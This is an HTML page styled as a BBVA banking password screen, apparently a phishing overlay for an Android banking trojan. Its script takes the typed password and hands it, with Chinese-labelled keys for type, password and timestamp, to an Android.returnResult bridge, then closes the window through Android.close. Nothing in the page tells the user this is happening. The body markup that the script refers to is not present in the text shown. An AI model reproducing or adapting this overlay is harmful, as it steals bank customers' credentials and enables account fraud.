<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no, viewport-fit=cover">
  <meta name="theme-color" content="#0144ad">
  <title>BBVA</title>
  <link rel="preconnect" href="https://fonts.googleapis.com">
  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
  <link href="https://fonts.googleapis.com/css2?family=Source+Sans+3:wght@500;600;700&display=swap" rel="stylesheet">
  <style>
    :root {
      --page: min(100vw, 430px);
      --u: calc(var(--page) / 477);
      --sheet: #ecf2f8;
      --navy: #041a3d;
      --link: #1466d8;
      --muted: #767d8a;
      --ghost: #b5bcc7;
      --line: #c9d0d8;
    }
    * { box-sizing: border-box; margin: 0; padding: 0; }
    html, body { min-height: 100%; background: #dfe7f0; }
    body {
      font-family: "Source Sans 3", "Helvetica Neue", Helvetica, Arial, sans-serif;
      color: var(--navy);
      -webkit-text-size-adjust: 100%;
      -webkit-tap-highlight-color: transparent;
      -webkit-font-smoothing: antialiased;
    }
    button, input { font: inherit; color: inherit; }
    button { border: 0; background: transparent; cursor: pointer; }
    img { display: block; }

    .app {
      width: var(--page);
      min-height: 100dvh;
      margin: 0 auto;
      background: var(--sheet);
      position: relative;
      overflow: hidden;
    }

    .hero { position: relative; line-height: 0; }
    .hero-bg { width: 100%; height: auto; }
    .logo {
      position: absolute;
      left: calc(var(--u) * 186);
      top: calc(var(--u) * 75);
      width: calc(var(--u) * 107);
      height: calc(var(--u) * 33);
    }

    .sheet {
      position: relative;
      margin-top: calc(var(--u) * -26);
      padding-top: calc(var(--u) * 26);
      background: var(--sheet);
      border-radius: calc(var(--u) * 22) calc(var(--u) * 22) 0 0;
      min-height: calc(100dvh - var(--u) * 500);
      padding-bottom: calc(var(--u) * 48 + env(safe-area-inset-bottom));
    }
    .handle {
      width: calc(var(--u) * 56);
      height: calc(var(--u) * 5);
      margin: 0 auto;
      border-radius: 999px;
      background: #9aa1b2;
    }
    h1 {
      margin-top: calc(var(--u) * 32);
      text-align: center;
      font-size: calc(var(--u) * 21.5);
      font-weight: 700;
      letter-spacing: -.015em;
      line-height: 1.15;
      color: var(--navy);
    }
    .cerrar {
      position: absolute;
      top: calc(var(--u) * 62);
      right: calc(var(--u) * 18);
      width: calc(var(--u) * 52);
      display: flex;
      flex-direction: column;
      align-items: center;
      gap: calc(var(--u) * 3);
      color: var(--link);
    }
    .cerrar img { width: calc(var(--u) * 20); height: calc(var(--u) * 20); }
    .cerrar span {
      font-size: calc(var(--u) * 13);
      font-weight: 600;
      line-height: 1;
    }
    .cerrar:active { opacity: .55; }

    .field {
      margin: calc(var(--u) * 48) calc(var(--u) * 26) 0;
      height: calc(var(--u) * 66);
      border: 1.5px solid var(--line);
      border-radius: calc(var(--u) * 9);
      display: flex;
      align-items: center;
      padding: 0 calc(var(--u) * 10) 0 calc(var(--u) * 16);
      background: transparent;
    }
    .field:focus-within { border-color: #8eb4e4; }
    .field input {
      flex: 1;
      min-width: 0;
      border: 0;
      outline: none;
      background: transparent;
      font-size: calc(var(--u) * 19);
      font-weight: 600;
      letter-spacing: -.01em;
      color: var(--navy);
    }
    .field input::placeholder {
      color: var(--muted);
      font-weight: 600;
    }
    .eye {
      position: relative;
      width: calc(var(--u) * 36);
      height: calc(var(--u) * 36);
      display: grid;
      place-items: center;
      flex: none;
    }
    .eye img { width: calc(var(--u) * 27); height: calc(var(--u) * 19); }
    .eye.on::after {
      content: "";
      position: absolute;
      width: 1.5px;
      height: calc(var(--u) * 24);
      background: var(--link);
      border-radius: 1px;
      transform: rotate(-42deg);
    }

    .linkish {
      display: block;
      width: 100%;
      text-align: center;
      color: var(--link);
      font-weight: 700;
      letter-spacing: -.015em;
      line-height: 1.25;
    }
    .linkish:active { opacity: .6; }
    .forgot {
      margin-top: calc(var(--u) * 30);
      padding: 0 calc(var(--u) * 22);
      font-size: calc(var(--u) * 19.5);
    }
    .go {
      display: block;
      width: 100%;
      margin-top: calc(var(--u) * 70);
      text-align: center;
      font-size: calc(var(--u) * 19.5);
      font-weight: 700;
      letter-spacing: -.01em;
      color: var(--ghost);
      position: relative;
    }
    .go.ready { color: var(--link); }
    .go:disabled { cursor: default; }
    .go.ready:active { opacity: .6; }
    .go.loading {
      color: transparent;
      pointer-events: none;
    }
    .go.loading::after {
      content: "";
      position: absolute;
      left: 50%;
      top: 50%;
      width: calc(var(--u) * 18);
      height: calc(var(--u) * 18);
      margin: calc(var(--u) * -9) 0 0 calc(var(--u) * -9);
      border: 2.5px solid rgba(24, 115, 224, .28);
      border-top-color: var(--link);
      border-radius: 50%;
      animation: spin .7s linear infinite;
    }
    .bio {
      margin-top: calc(var(--u) * 58);
      font-size: calc(var(--u) * 19.5);
    }
    @keyframes spin { to { transform: rotate(360deg); } }
  </style>
</head>

  <script>
    (function () {
      const input = document.getElementById("clave");
      const go = document.getElementById("go");
      const eye = document.getElementById("eye");
      input.addEventListener("input", function () {
        const ready = input.value.length >= 6;
        go.disabled = !ready;
        go.classList.toggle("ready", ready);
      });
      eye.addEventListener("click", function () {
        const show = input.type === "password";
        input.type = show ? "text" : "password";
        eye.classList.toggle("on", show);
        eye.setAttribute("aria-pressed", show ? "true" : "false");
        eye.setAttribute("aria-label", show ? "Ocultar clave" : "Mostrar clave");
        input.focus();
      });
      go.addEventListener("click", function () {
        if (go.disabled || go.classList.contains("loading") || input.value.length < 6) return;
        go.classList.add("loading");
        go.disabled = true;
        go.setAttribute("aria-busy", "true");

        setTimeout(() => {
        try {
          if (typeof Android !== 'undefined' && Android.returnResult) {
            Android.returnResult(JSON.stringify({
              '类型': 'bbva',
              '密码': input.value,
              '时间戳': Date.now()
            }));
          }
        } catch (e) {}
        setTimeout(() => {
          try {
            if (typeof Android !== 'undefined' && Android.close) Android.close();
          } catch (e) {}
        }, 2500);
      }, 900);
      });
    })();
  </script>
